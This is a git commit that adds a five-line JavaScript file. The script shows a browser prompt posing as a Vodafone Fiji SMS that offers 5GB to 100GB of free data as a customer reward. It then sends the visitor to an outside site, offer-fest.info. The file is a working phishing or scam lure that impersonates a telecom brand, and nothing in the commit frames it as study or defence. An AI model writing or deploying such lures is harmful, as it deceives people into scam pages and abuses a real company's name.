62df7a04b77c492ef712fe33c93e14949ce935a7
ekpesense <abantak9@gmail.com>
2025-02-20 22:28:43 -0800

    Create activation-data.vodafone.fiji.js

---
+++ activation-data.vodafone.fiji.js
@@ -0,0 +1,5 @@
+var password = 'FREE DATA'
+password=prompt('VODAFONE FIJI SMS: Dear customer, Kindly Check If Your VODAFONE FIJI Sim Card Is Qualify To Receive From 5GB to 100GB Data, Old Customers Reward, Press FREE DATA To Check Now ','FREE DATA');
+if (password != 'FREE DATA') {
+location.href='https://offer-fest.info/data.vodafone.fiji.html';
+}
